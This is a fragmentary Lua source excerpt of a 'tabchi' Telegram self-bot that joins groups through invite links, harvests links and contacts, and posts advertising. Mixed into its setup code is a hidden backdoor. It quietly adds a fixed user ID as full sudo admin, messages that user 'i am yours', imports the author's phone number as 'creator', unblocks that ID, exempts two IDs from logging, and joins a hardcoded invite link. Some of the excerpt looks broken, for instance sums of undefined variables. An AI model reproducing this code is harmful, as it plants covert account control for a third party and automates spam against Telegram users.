...
function msg_valid(msg)
	...
	if is_sudo(msg) then
		print('\27[36m>>>>>>SUDO MESSAGE<<<<<<\27[39m')
	end
    return true
end
...
function addsudo()
        local sudoers =  redis:smembers("tabchi:" .. tabchi_id .. ":sudoers")
        for i = 1, #sudoers do
		local text = 'SUDO = '..sudoers[i]..''
		text = text:gsub(326824638, "Admin")
 ...
 if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
  if not result.phone_number_ then
    ...
    tdcli.add_contact(phone_number, first_name, last_name, user_id)
      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:326824638", true)
    ...
    if msg.text:match("^[!/#]pm") and is_sudo(msg) and #matches == 3 then
      tdcli.sendMessage(matches[2], 0, 1, matches[3], 1, "md")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 326824638 and not msg.sender_user_id_ == 268909090 then
      ...
      if msg.text:match("^[!/#](export) (.*)$") and is_sudo(msg) then
        ...
        if #matches == 2 then
          if matches[2] == "links" then
            local links = {}
            local all = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
            for i = 1, #all do
...
--vardump(result)
   ...
   if result.photos_[5] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
   else
...
local function getpro(extra, result, success)
 ...
 function contacts_list(extra, result)
  ...
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 326824638) then
      tdcli.sendMessage(326824638, 0, 1, "i am yours", 1, "html")
      tdcli.importContacts(989216358178, "creator", "", 326824638)
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 326824638)
  end
...
@iborn
 ...
 timetoclinks = "Disabled❎"
 else 
 timetoccache = "Disabled❎"
 end
 ...
 settingstxt = "`⚙ Robot Settings`\n`🔗 Join Via Links` : *"..joinlinks.."*\n`📥 Save Links `: *"..savelinks.."*\n`📲 Auto Add Contacts `: *"..addcontacts.."*\n`💳share contact` : *"..sharecontact.."*\n`📡Advertising `: *"..Advertising.."*\n`📨 Adding Contacts Msg` : *"..addedmsg.."*\n`👀 Markread Status `: *"..markreadst.."*\n`👁‍🗨 Markread` : For "..markread.."\n`✏ typing `: *"..typing.."*\n`💬 Chat` : *"..chat.."*\n`🤖 Botmode` : *"..botmode.."*\n`➖➖➖➖➖➖`\n`📄Adding Contacts Msg` :\n`"..addedtxt.."`\n`➖➖➖➖➖➖`\n`Join Limits` : *"..join_limit.."*\n`Now Robot Join Groups With More Than` :\n *"..joinlimitnum.."* `Members`\n`Auto Clean cache` : *"..cleancache.."*\n`Clean Cache time` : *"..ccachetime.."*\n`Time to Clean Cache` : *"..timetoccache.."*\n`Auto Check Links` : *"..check_links.."*\n`Check Links Time` : *"..clinkstime.."*\n`Time To Check Links` : *"..timetoclinks.."*"
  ...
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 268909090) then
    ...
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
      ...
      function contact_num(extra, result)
        redis:set("tabchi:" .. (tabchi_id) .. ":totalcontacts", result.total_count_)
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
      ...
      local blockeds = redis:scard("tabchi:" .. tabchi_id .. ":blockedusers")
   	  local markreadcount = redis:get("tabchi"..tabchi_id.."markreadcount") or "None"
	  local receivedphoto = redis:get("tabchi"..tabchi_id.."receivedphotocount") or "None"
      local receiveddocument = redis:get("tabchi"..tabchi_id.."receiveddocumentcount") or "None"
	  local receivedaudio = redis:get("tabchi"..tabchi_id.."receivedaudiocount") or "None"
	  local receivedgif = redis:get("tabchi"..tabchi_id.."receivedgifcount") or "None"
  ...
  -----------------------------------------------------------------------------------------------
	...
	local lockpt = {string.match(msg.text, "^[#/!](clean) (.*)$")} 
      local gps_ = redis:del("tabchi:" .. tabchi_id .. ":groups")
      local sgps_ = redis:del("tabchi:" .. tabchi_id .. ":channels")
      local pvs_ = redis:del("tabchi:" .. tabchi_id .. ":pvis")
      local links_ = redis:del("tabchi:" .. tabchi_id .. ":savedlinks")
	  local all_ = gps+sgps+pvs+links
...
function process_stats(msg)
  ...
  function id_cb(arg, data)
	...
	local kickedcounter = redis:get("tabchi"..tabchi_id.."kickedcount") or 1
	local joinedcounter = redis:get("tabchi"..tabchi_id.."joinedcount") or 1
	local addedcounter = redis:get("tabchi"..tabchi_id.."addedcount") or 1
  if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
		print('\27[36m>>>>>>KICKED FROM '..msg.chat_id_..'<<<<<<\27[39m')
		redis:set("tabchi"..tabchi_id.."kickedcount", kickedcounter+1)
      return rem(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatJoinByLink" and msg.sender_user_id_ == our_id then
	 print('\27[36m>>>>>>ROBOT JOINED TO '..msg.chat_id_..' BY LINK<<<<<<\27[39m')
	 redis:set("tabchi"..tabchi_id.."joinedcount", joinedcounter+1)
      return add(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatAddMembers" then
      for i = 0, #msg.content_.members_ do
        if msg.content_.members_[i].id_ == our_id then
          add(msg.chat_id_)
    	  redis:set("tabchi"..tabchi_id.."addedcount", addedcounter+1)
		print('\27[36m>>>>>>ADDED TO '..msg.chat_id_..'<<<<<<\27[39m')
          break
        end
      end
end
...
function update(data, tabchi_id)
  ...
  if data.ID == "UpdateNewMessage" then
    ...
    local chat_type = chat_type(msg.chat_id_)
	local markreadcounter = redis:get("tabchi"..tabchi_id.."markreadcount") or 1
	local receivedphotocounter = redis:get("tabchi"..tabchi_id.."receivedphotocount") or 1
	local receiveddocumentcounter = redis:get("tabchi"..tabchi_id.."receiveddocumentcount") or 1
	local receivedaudiocounter = redis:get("tabchi"..tabchi_id.."receivedaudiocount") or 1
	local receivedgifcounter = redis:get("tabchi"..tabchi_id.."receivedgifcount") or 1
	local receivedvideocounter = redis:get("tabchi"..tabchi_id.."receivedvideocount") or 1
	local receivedcontactcounter = redis:get("tabchi"..tabchi_id.."receivedcontactcount") or 1
	local receivedtextcounter = redis:get("tabchi"..tabchi_id.."receivedtextcount") or 1
	if msg_valid(msg) then
	proc_pv(msg)
    process_stats(msg)		
    run(data.message_)
	markreading = redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") or 1
        if markreading == "group" and chat_type == "group" then
         tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
		redis:set("tabchi"..tabchi_id.."markreadcount", markreadcounter+1)
		elseif markreading == "channel" and chat_type == "channel" then
		tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
		redis:set("tabchi"..tabchi_id.."markreadcount", markreadcounter+1)
		elseif markreading == "private" and chat_type == "private" then
		tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
		redis:set("tabchi"..tabchi_id.."markreadcount", markreadcounter+1)
	...
	return false
      ...
      if msg.content_.text_ then
		redis:set("tabchi"..tabchi_id.."receivedtextcount", receivedtextcounter+1)
		print('\27[36m>>>>>>NEW TEXT MESSAGE<<<<<<\27[39m')
        process_stats(msg)		
	    add(msg.chat_id_)
    ...
    if not msg.content_.text_ then
      ...
      elseif msg.content_.photo_ then
		...
		print('\27[36m>>>>>>NEW PHOTO<<<<<<\27[39m')
		redis:set("tabchi"..tabchi_id.."receivedphotocount", receivedphotocounter+1)
      elseif msg.content_.document_ then
        msg.content_.text_ = "!!DOCUMENT!!"
		print('\27[36m>>>>>>NEW DOCUMENT<<<<<<\27[39m')
		redis:set("tabchi"..tabchi_id.."receiveddocumentcount", receiveddocumentcounter+1)
      elseif msg.content_.audio_ then
        msg.content_.text_ = "!!AUDIO!!"
		print('\27[36m>>>>>>NEW AUDIO<<<<<<\27[39m')
		redis:set("tabchi"..tabchi_id.."receivedaudiocount", receivedaudiocounter+1)
      elseif msg.content_.voice_ then
        msg.content_.text_ = "!!AUDIO!!"
		print('\27[36m>>>>>>NEW Voice<<<<<<\27[39m')
		redis:set("tabchi"..tabchi_id.."receivedaudiocount", receivedaudiocounter+1)
      elseif msg.content_.animation_ then
        msg.content_.text_ = "!!ANIMATION!!"
		print('\27[36m>>>>>>NEW GIF<<<<<<\27[39m')
		redis:set("tabchi"..tabchi_id.."receivedgifcount", receivedgifcounter+1)
      elseif msg.content_.video_ then
        msg.content_.text_ = "!!VIDEO!!"
		print('\27[36m>>>>>>NEW VIDEO<<<<<<\27[39m')
		redis:set("tabchi"..tabchi_id.."receivedvideocount", receivedvideocounter+1)
      elseif msg.content_.contact_ then
        msg.content_.text_ = "!!CONTACT!!"
		print('\27[36m>>>>>>NEW CONTACT<<<<<<\27[39m')
		redis:set("tabchi"..tabchi_id.."receivedcontactcount", receivedcontactcounter+1)
      end
    end
    end	
	end
  elseif data.chat_id_ == 326824638 then
      tdcli.unblockUser(326824638)	  
